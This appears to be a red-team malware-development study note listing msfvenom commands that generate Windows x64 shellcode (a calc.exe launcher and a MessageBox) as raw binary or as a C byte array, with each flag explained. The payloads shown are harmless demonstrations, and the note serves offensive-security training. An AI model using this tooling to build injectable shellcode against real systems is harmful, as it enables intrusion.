this is a list of command to generate a payloads using `msfvenom`
## Raw format
### command execution payloads
```bash
msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f raw -o calc_shellcode.bin
```

Explanation:
- `-p windows/x64/exec`: Specifies the payload to use. For the 64-bit we find the payload under `x64` folder.
- `CMD=calc.exe`: The command to execute, in this case launching the Windows Calculator (calc.exe).
- `EXITFUNC=thread`: Defines how the payload exits after execution. Setting it to thread ensures the payload exits cleanly by terminating the thread it runs in, rather than the entire process.
- `-f raw`: Specifies the output format of the payload, as raw binary data a plain sequence of bytes with no additional formatting.
- `-o calc_shellcode.bin`: Saves the generated shellcode to a file named calc_shellcode.bin

### MessageBox payload
```bash
msfvenom -p windows/x64/messagebox TITLE="RTO: MalDev" TEXT="Hi from Red Team Operator!" EXITFUNC=thread -f raw -o msgbox_shellcode.bin
```

#### Explanation:

- `-p windows/x64/messagebox`: Specifies the 64-bit Windows payload that displays a MessageBox using the _MessageBoxA()_ function from the Windows API.
- `TITLE="RTO: MalDev"`: Sets the title of the MessageBox
- `TEXT="Hi from Red Team Operator!"`: Sets the message content of the MessageBox
- `EXITFUNC=thread`: Ensures the payload exits by terminating its thread, leaving the parent process intact for stability.
- `-f raw`: Outputs the shellcode as raw binary data.
- `-o msgbox_shellcode.bin`: Saves the shellcode to a file named msgbox_shellcode.bin.
# "C" format
```bash
msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f c
```
#### Explanation:

- `-f c`: Specifies the output format as a C-style array (e.g., `unsigned char buf[] = "\xFC\xE8...";`), which can be copied directly into a C program.
